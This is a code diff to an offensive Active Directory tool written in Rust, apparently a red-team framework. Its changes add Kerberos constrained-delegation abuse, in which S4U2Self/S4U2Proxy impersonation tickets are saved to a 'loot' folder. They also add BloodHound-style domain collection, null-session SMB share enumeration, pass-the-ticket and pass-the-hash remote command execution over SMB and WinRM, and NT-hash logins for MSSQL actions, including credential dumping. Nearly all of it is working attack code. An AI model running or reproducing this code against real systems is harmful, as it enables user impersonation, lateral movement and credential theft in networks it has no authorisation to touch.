@@ -400,6 +400,9 @@ enum Commands {
         target: String,
         #[arg(short, long)]
         command: String,
+        /// IP address to connect to directly (bypasses DNS resolution)
+        #[arg(long)]
+        target_ip: Option<String>,
     },
 
     /// Attack graph operations
@@ -1967,6 +1970,15 @@ enum KerberosAction {
         /// Service Principal Name
         #[arg(short, long, required = true)]
         spn: String,
+        /// User to impersonate via S4U2Self + S4U2Proxy (constrained delegation abuse)
+        #[arg(long)]
+        impersonate: Option<String>,
+        /// Alternative service name for SPN relaxation attack (e.g. cifs/DC01@DOMAIN)
+        #[arg(long)]
+        altservice: Option<String>,
+        /// Force forwardable flag on the S4U2Self ticket
+        #[arg(long, default_value_t = false)]
+        force_forwardable: bool,
     },
     /// Request a TGT (requires credentials or NT hash)
     GetTgt,
@@ -1997,6 +2009,9 @@ enum KerberosAction {
         /// Service Principal Name
         #[arg(short, long, required = true)]
         spn: String,
+        /// User to impersonate via S4U2Self + S4U2Proxy
+        #[arg(long)]
+        impersonate: Option<String>,
     },
     /// Rubeus-style brute -- AS-REQ brute-force a single user
     Brute {
@@ -2905,6 +2920,18 @@ enum BloodHoundAction {
         #[arg(short, long)]
         output: Option<String>,
     },
+    /// Collect BloodHound data via LDAP (SharpHound-equivalent)
+    Collect {
+        /// Collection methods: users, groups, computers, sessions, all (comma-separated)
+        #[arg(short, long, default_value = "all")]
+        collection: String,
+        /// Output directory for JSON files
+        #[arg(short, long, default_value = "./bloodhound")]
+        output_dir: String,
+        /// Compress output to a zip file
+        #[arg(long, default_value_t = false)]
+        zip: bool,
+    },
 }
 
 // ----------------------------------------------------------
@@ -3234,7 +3261,8 @@ async fn async_main() -> i32 {
             ref method,
             ref target,
             ref command,
-        } => cmd_exec(&cli, method.clone(), target, command).await,
+            ref target_ip,
+        } => cmd_exec(&cli, method.clone(), target, command, target_ip.as_deref()).await,
         Commands::Graph {
             ref file,
             ref action,
@@ -7312,7 +7340,12 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             let users = overthrone_hunter::userenum::embedded_usernames();
             return roast_users(users, domain).await;
         }
-        KerberosAction::GetTgs { spn } => {
+        KerberosAction::GetTgs {
+            spn,
+            impersonate,
+            altservice: _altservice,
+            force_forwardable: _force_forwardable,
+        } => {
             use overthrone_core::proto::kerberos;
             let creds = match require_creds(cli) {
                 Ok(c) => c,
@@ -7342,29 +7375,103 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     return 1;
                 }
             };
-            // Request service ticket
-            match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
-                Ok(st) => {
-                    println!(
-                        "{} Service ticket for {} obtained",
-                        "[+]".green(),
-                        spn.cyan()
-                    );
-                    let loot_dir = std::path::PathBuf::from("./loot");
-                    let _ = std::fs::create_dir_all(&loot_dir);
-                    let safe_spn = spn.replace('/', "_");
-                    let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
-                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
-                        use kerberos_asn1::Asn1Object;
-                        use std::io::Write;
-                        let _ = f.write_all(&st.ticket.build());
-                        println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+
+            if let Some(ref impersonate_user) = impersonate {
+                // S4U2Self + S4U2Proxy flow (constrained delegation abuse)
+                println!(
+                    "{} S4U2Self: impersonating {}",
+                    "[*]".cyan(),
+                    impersonate_user.cyan()
+                );
+
+                // Step 1: S4U2Self -- get a ticket to self on behalf of impersonate_user
+                let s4u2self_ticket = match kerberos::s4u2self(&dc, &tgt, impersonate_user).await {
+                    Ok(t) => {
+                        println!(
+                            "{} S4U2Self ticket obtained for {}",
+                            "[+]".green(),
+                            impersonate_user.green()
+                        );
+                        t
                     }
-                    banner::print_success("TGS obtained");
+                    Err(e) => {
+                        banner::print_fail(&format!("S4U2Self failed: {}", e));
+                        return 1;
+                    }
+                };
+
+                // Step 2: S4U2Proxy -- get a ticket to the target SPN as impersonate_user
+                println!(
+                    "{} S4U2Proxy: requesting ticket for {} as {}",
+                    "[*]".cyan(),
+                    spn.cyan(),
+                    impersonate_user.cyan()
+                );
+                let final_ticket =
+                    match kerberos::s4u2proxy(&dc, &tgt, &s4u2self_ticket, &spn).await {
+                        Ok(t) => {
+                            println!(
+                                "{} S4U2Proxy ticket obtained for {}",
+                                "[+]".green(),
+                                spn.green()
+                            );
+                            t
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("S4U2Proxy failed: {}", e));
+                            return 1;
+                        }
+                    };
+
+                // Save the ticket as .ccache
+                let loot_dir = std::path::PathBuf::from("./loot");
+                let _ = std::fs::create_dir_all(&loot_dir);
+                let safe_spn = spn.replace('/', "_");
+                let realm_upper = final_ticket.client_realm.to_uppercase();
+                let kirbi_path = loot_dir.join(format!(
+                    "{}@{}_{}.kirbi",
+                    impersonate_user, safe_spn, realm_upper
+                ));
+                let kirbi_bytes = kerberos::tgd_to_kirbi(&final_ticket);
+                if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
+                    println!("{} Saved ticket to {}", "->".cyan(), kirbi_path.display());
                 }
-                Err(e) => {
-                    banner::print_fail(&format!("TGS request failed: {}", e));
-                    return 1;
+
+                // Also export KRB5CCNAME path
+                println!(
+                    "{} Tip: export KRB5CCNAME={}",
+                    "[*]".bright_black(),
+                    kirbi_path.display()
+                );
+                banner::print_success(&format!(
+                    "Constrained delegation ticket: {} -> {}",
+                    impersonate_user, spn
+                ));
+            } else {
+                // Standard TGS request (no impersonation)
+                match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
+                    Ok(st) => {
+                        println!(
+                            "{} Service ticket for {} obtained",
+                            "[+]".green(),
+                            spn.cyan()
+                        );
+                        let loot_dir = std::path::PathBuf::from("./loot");
+                        let _ = std::fs::create_dir_all(&loot_dir);
+                        let safe_spn = spn.replace('/', "_");
+                        let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
+                        if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
+                            use kerberos_asn1::Asn1Object;
+                            use std::io::Write;
+                            let _ = f.write_all(&st.ticket.build());
+                            println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+                        }
+                        banner::print_success("TGS obtained");
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("TGS request failed: {}", e));
+                        return 1;
+                    }
                 }
             }
         }
@@ -7461,8 +7568,121 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         KerberosAction::Asktgt => {
             return commands_impl::cmd_asktgt(cli, &dc).await;
         }
-        KerberosAction::Asktgs { spn } => {
-            return commands_impl::cmd_asktgs(cli, &dc, &spn).await;
+        KerberosAction::Asktgs { spn, impersonate } => {
+            // Inline GetTgs logic with impersonate support
+            use overthrone_core::proto::kerberos;
+            let creds = match require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+            let (secret, use_hash) = match creds.secret_and_hash_flag() {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+            let tgt = match crate::commands_impl::get_cached_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
+                &secret,
+                use_hash,
+                false,
+            )
+            .await
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
+                    return 1;
+                }
+            };
+            if let Some(ref impersonate_user) = impersonate {
+                println!(
+                    "{} S4U2Self: impersonating {}",
+                    "[*]".cyan(),
+                    impersonate_user.cyan()
+                );
+                let s4u2self_ticket = match kerberos::s4u2self(&dc, &tgt, impersonate_user).await {
+                    Ok(t) => {
+                        println!(
+                            "{} S4U2Self obtained for {}",
+                            "[+]".green(),
+                            impersonate_user.green()
+                        );
+                        t
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("S4U2Self failed: {}", e));
+                        return 1;
+                    }
+                };
+                println!(
+                    "{} S4U2Proxy: requesting ticket for {} as {}",
+                    "[*]".cyan(),
+                    spn.cyan(),
+                    impersonate_user.cyan()
+                );
+                let final_ticket =
+                    match kerberos::s4u2proxy(&dc, &tgt, &s4u2self_ticket, &spn).await {
+                        Ok(t) => {
+                            println!("{} S4U2Proxy obtained for {}", "[+]".green(), spn.green());
+                            t
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("S4U2Proxy failed: {}", e));
+                            return 1;
+                        }
+                    };
+                let loot_dir = std::path::PathBuf::from("./loot");
+                let _ = std::fs::create_dir_all(&loot_dir);
+                let safe_spn = spn.replace('/', "_");
+                let realm_upper = final_ticket.client_realm.to_uppercase();
+                let kirbi_path = loot_dir.join(format!(
+                    "{}@{}_{}.kirbi",
+                    impersonate_user, safe_spn, realm_upper
+                ));
+                let kirbi_bytes = kerberos::tgd_to_kirbi(&final_ticket);
+                if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
+                    println!("{} Saved ticket to {}", "->".cyan(), kirbi_path.display());
+                }
+                println!(
+                    "{} Tip: export KRB5CCNAME={}",
+                    "[*]".bright_black(),
+                    kirbi_path.display()
+                );
+                banner::print_success(&format!(
+                    "Constrained delegation ticket: {} -> {}",
+                    impersonate_user, spn
+                ));
+            } else {
+                match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
+                    Ok(st) => {
+                        println!(
+                            "{} Service ticket for {} obtained",
+                            "[+]".green(),
+                            spn.cyan()
+                        );
+                        let loot_dir = std::path::PathBuf::from("./loot");
+                        let _ = std::fs::create_dir_all(&loot_dir);
+                        let safe_spn = spn.replace('/', "_");
+                        let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
+                        if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
+                            use kerberos_asn1::Asn1Object;
+                            use std::io::Write;
+                            let _ = f.write_all(&st.ticket.build());
+                            println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+                        }
+                        banner::print_success("TGS obtained");
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("TGS request failed: {}", e));
+                        return 1;
+                    }
+                }
+            }
+            return 0;
         }
         KerberosAction::Brute {
             ref wordlist,
@@ -7529,35 +7749,67 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
 // cmd_smb
 async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
     banner::print_module_banner("SMB");
-    let creds = match require_creds(cli) {
-        Ok(c) => c,
-        Err(e) => return e,
-    };
-    let (secret, use_hash) = match creds.secret_and_hash_flag() {
-        Ok(s) => s,
-        Err(e) => {
-            banner::print_fail(&e);
-            return 1;
-        }
+
+    // Try to resolve credentials; if none provided, use anonymous/null session
+    let creds_result = require_creds_silent(cli);
+    let creds = match &creds_result {
+        Ok(c) => Some(c.clone()),
+        Err(_) => None,
     };
 
-    // Helper closure to connect
+    // Helper closure to connect -- tries credentialed first, falls back to anonymous
     let smb_connect = |target: &str| {
-        let domain = creds.domain.clone();
-        let username = creds.username.clone();
-        let secret = secret.clone();
+        let creds_clone = creds.clone();
         let target = target.to_string();
         async move {
-            if use_hash {
-                overthrone_core::proto::smb::SmbSession::connect_with_hash(
-                    &target, &domain, &username, &secret,
-                )
-                .await
+            if let Some(ref creds) = creds_clone {
+                // Check for Kerberos ticket auth first
+                if let auth::AuthData::KerberosTicket(ref ticket_path) = creds.auth {
+                    let ticket =
+                        overthrone_core::proto::smb::KerberosTicket::from_kirbi(ticket_path)
+                            .map_err(|e| {
+                                overthrone_core::OverthroneError::Auth(format!(
+                                    "Failed to load Kerberos ticket: {}",
+                                    e
+                                ))
+                            })?;
+                    return overthrone_core::proto::smb::SmbSession::connect_with_ticket(
+                        &target,
+                        &creds.domain,
+                        &creds.username,
+                        ticket,
+                    )
+                    .await;
+                }
+                // Password or hash auth
+                match creds.secret_and_hash_flag() {
+                    Ok((secret, use_hash)) => {
+                        if use_hash {
+                            overthrone_core::proto::smb::SmbSession::connect_with_hash(
+                                &target,
+                                &creds.domain,
+                                &creds.username,
+                                &secret,
+                            )
+                            .await
+                        } else {
+                            overthrone_core::proto::smb::SmbSession::connect(
+                                &target,
+                                &creds.domain,
+                                &creds.username,
+                                &secret,
+                            )
+                            .await
+                        }
+                    }
+                    Err(_) => {
+                        // Other unsupported auth -- try anonymous
+                        overthrone_core::proto::smb::SmbSession::connect_anonymous(&target).await
+                    }
+                }
             } else {
-                overthrone_core::proto::smb::SmbSession::connect(
-                    &target, &domain, &username, &secret,
-                )
-                .await
+                // No credentials provided -- use anonymous/null session
+                overthrone_core::proto::smb::SmbSession::connect_anonymous(&target).await
             }
         }
     };
@@ -7571,16 +7823,16 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                     return 1;
                 }
             };
-            let shares = smb
-                .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON", "print$"])
-                .await;
+            // Enumerate all shares via SRVSVC NetShareEnumAll, then check access
+            let shares = smb.enumerate_accessible_shares().await;
             println!(
-                "\n {:<15} {:<10} {}",
+                "\n {:<25} {:<8} {:<8} {}",
                 "Share".bold(),
+                "Type".bold(),
                 "Read".bold(),
                 "Write".bold()
             );
-            println!(" {}", "-".repeat(40));
+            println!(" {}", "-".repeat(55));
             for s in &shares {
                 let read = if s.readable {
                     "[+]".green().to_string()
@@ -7592,12 +7844,23 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                 } else {
                     "[-]".red().to_string()
                 };
-                println!(" {:<15} {:<10} {}", s.share_name, read, write);
+                let share_type = if s.is_admin_share {
+                    "Admin"
+                } else if s.share_name == "IPC$" {
+                    "IPC"
+                } else {
+                    "Disk"
+                };
+                println!(
+                    " {:<25} {:<8} {:<8} {}",
+                    s.share_name, share_type, read, write
+                );
             }
             banner::print_success(&format!(
-                "{} shares found, {} readable",
+                "{} shares found, {} readable, {} writable",
                 shares.len(),
-                shares.iter().filter(|s| s.readable).count()
+                shares.iter().filter(|s| s.readable).count(),
+                shares.iter().filter(|s| s.writable).count()
             ));
         }
         SmbAction::Admin { targets } => {
@@ -8263,7 +8526,15 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
 }
 
 // cmd_exec
-async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
+async fn cmd_exec(
+    cli: &Cli,
+    method: ExecMethod,
+    target: &str,
+    command: &str,
+    target_ip: Option<&str>,
+) -> i32 {
+    // Use target_ip for SMB connections if provided (bypasses DNS resolution)
+    let smb_target = target_ip.unwrap_or(target);
     banner::print_module_banner("EXECUTION");
     let creds = match require_creds(cli) {
         Ok(c) => c,
@@ -8283,14 +8554,6 @@ async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) ->
         .await;
     }
 
-    let (secret, use_hash) = match creds.secret_and_hash_flag() {
-        Ok(s) => s,
-        Err(e) => {
-            banner::print_fail(&e);
-            return 1;
-        }
-    };
-
     println!(
         "{} {} on {} via {:?}",
         "!".bright_black(),
@@ -8299,23 +8562,52 @@ async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) ->
         method
     );
 
-    // Connect via SMB
-    let smb = if use_hash {
-        overthrone_core::proto::smb::SmbSession::connect_with_hash(
-            target,
-            &creds.domain,
-            &creds.username,
-            &secret,
-        )
-        .await
-    } else {
-        overthrone_core::proto::smb::SmbSession::connect(
-            target,
-            &creds.domain,
-            &creds.username,
-            &secret,
-        )
-        .await
+    // Connect via SMB -- handle password, hash, and ticket auth
+    let smb = match &creds.auth {
+        auth::AuthData::KerberosTicket(ticket_path) => {
+            // Load the Kerberos ticket from ccache/kirbi file
+            let ticket = match overthrone_core::proto::smb::KerberosTicket::from_kirbi(ticket_path)
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!(
+                        "Failed to load Kerberos ticket from {}: {}",
+                        ticket_path, e
+                    ));
+                    return 1;
+                }
+            };
+            println!(
+                " {} Loading Kerberos ticket from {}",
+                "[*]".bright_black(),
+                ticket_path.cyan()
+            );
+            overthrone_core::proto::smb::SmbSession::connect_with_ticket(
+                smb_target,
+                &creds.domain,
+                &creds.username,
+                ticket,
+            )
+            .await
+        }
+        auth::AuthData::NtlmHash(hash) => {
+            overthrone_core::proto::smb::SmbSession::connect_with_hash(
+                smb_target,
+                &creds.domain,
+                &creds.username,
+                hash,
+            )
+            .await
+        }
+        auth::AuthData::Password(pass) => {
+            overthrone_core::proto::smb::SmbSession::connect(
+                smb_target,
+                &creds.domain,
+                &creds.username,
+                pass,
+            )
+            .await
+        }
     };
 
     let smb = match smb {
@@ -8345,10 +8637,29 @@ async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) ->
             .await
             .map(|r| (r.success, r.output)),
         ExecMethod::WinRm => {
-            // WinRM falls back to smbexec for now
-            smbexec::exec_command(&smb, command)
-                .await
-                .map(|r| (r.success, r.output))
+            // WinRM uses HTTP/WSMAN -- no SMB session needed, dispatch via WinRM executor
+            use overthrone_core::exec::{ExecCredentials, RemoteExecutor, winrm::WinRmExecutor};
+            let exec_creds = ExecCredentials {
+                domain: creds.domain.clone(),
+                username: creds.username.clone(),
+                password: creds.password().unwrap_or("").to_string(),
+                nt_hash: creds.nthash().map(|h| h.to_string()),
+            };
+            let executor = WinRmExecutor::new(exec_creds);
+            match executor.execute(smb_target, command).await {
+                Ok(output) => {
+                    let combined = if output.stderr.is_empty() {
+                        output.stdout
+                    } else {
+                        format!("{}\n{}", output.stdout, output.stderr)
+                    };
+                    let success = output.exit_code.is_none_or(|c| c == 0);
+                    Ok((success, combined))
+                }
+                Err(e) => Err(overthrone_core::OverthroneError::ExecSimple(
+                    format!("WinRM execution failed: {}", e),
+                )),
+            }
         }
         ExecMethod::Auto => {
             // Try all methods in order of reliability: SmbExec -> PsExec -> WmiExec
@@ -9035,16 +9346,19 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
         Err(e) => return e,
     };
 
-    let password = match creds.password() {
-        Some(p) => p.to_string(),
-        None => {
+    // Determine auth type: password, NT hash, or reject ticket
+    let use_hash = match &creds.auth {
+        auth::AuthData::KerberosTicket(_) => {
             banner::print_fail(
-                "MSSQL TDS authentication requires a plaintext password; \
- NT hash and Kerberos ticket auth are not supported over TDS",
+                "MSSQL TDS authentication does not support Kerberos tickets; \
+ use --username/--password or --nt-hash instead",
             );
             return 1;
         }
+        auth::AuthData::NtlmHash(_) => true,
+        auth::AuthData::Password(_) => false,
     };
+    let (secret, _) = creds.secret_and_hash_flag().unwrap_or_default();
 
     if let Some(p) = proxy {
         banner::print_info(&format!("Using SOCKS5 proxy: {}", p));
@@ -9063,10 +9377,17 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 database.cyan(),
                 query.yellow()
             );
-            let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
-                .with_database(&database)
-                .with_proxy(proxy);
+            let config = if use_hash {
+                MssqlConfig::new(&target)
+                    .with_ntlm_hash_auth(&creds.domain, &creds.username, &secret)
+                    .with_database(&database)
+                    .with_proxy(proxy)
+            } else {
+                MssqlConfig::new(&target)
+                    .with_ntlm_auth(&creds.domain, &creds.username, &secret)
+                    .with_database(&database)
+                    .with_proxy(proxy)
+            };
             let mut client = match MssqlClient::connect(config).await {
                 Ok(c) => c,
                 Err(e) => {
@@ -9106,7 +9427,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 command.yellow()
             );
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database("master")
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
@@ -9140,7 +9461,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 target.cyan()
             );
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database("master")
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
@@ -9189,7 +9510,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 target.cyan()
             );
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database("master")
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
@@ -9218,7 +9539,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 target.cyan()
             );
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database("master")
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
@@ -9265,7 +9586,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 println!("{} Auditing {}...", ">".bright_black(), target.cyan());
 
                 let config = MssqlConfig::new(target.as_str())
-                    .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                    .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                     .with_database("master")
                     .with_proxy(proxy);
                 let mut client = match MssqlClient::connect(config).await {
@@ -9342,7 +9663,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
         }
         MssqlAction::DumpCredentials { target, database } => {
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database(database.as_str())
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
@@ -9420,7 +9741,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
             }
 
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database(database.as_deref().unwrap_or("master"))
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
@@ -9543,7 +9864,7 @@ async fn cmd_mssql(cli: &Cli, action: MssqlAction, proxy: Option<&str>) -> i32 {
                 action.yellow()
             );
             let config = MssqlConfig::new(&target)
-                .with_ntlm_auth(&creds.domain, &creds.username, &password)
+                .with_ntlm_auth(&creds.domain, &creds.username, &secret)
                 .with_database("msdb")
                 .with_proxy(proxy);
             let mut client = match MssqlClient::connect(config).await {
